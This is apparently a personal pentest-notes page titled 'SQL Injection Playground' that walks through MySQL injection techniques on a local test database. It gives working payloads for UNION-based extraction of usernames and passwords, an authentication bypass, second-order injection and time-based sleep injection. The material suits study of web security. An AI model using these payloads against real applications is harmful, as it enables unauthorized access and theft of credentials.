# SQL Injection Playground

This is my playground for all things SQL injection which helps me visualize some of the most commont sqli techniques.

## Classic SQL Injection

### Union Select Data Extraction

```sql
mysql> select * from users where user_id = 1 order by 7;              
ERROR 1054 (42S22): Unknown column '7' in 'order clause'
mysql> select * from users where user_id = 1 order by 6;
mysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-15-59-39.png)

```sql
select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-16-03-00.png)

### Authentication Bypass

```sql
mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99' 
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-16-16-06.png)

### Second Order Injection

```sql
mysql> insert into accounts (username, password, mysignature) values ('admin','mynewpass',(select user())) # 'mynewsignature');
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-16-57-24.png)

## Time Based SQL Injection

### Sleep Invokation

```sql
mysql> select * from users where user_id = 1 or (select sleep(1)+1);
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-15-51-50.png)

```sql
select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-15-53-52.png)

### References

{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}

{% embed url="https://www.youtube.com/watch?v=Rqt\_BgG5YyI" %}

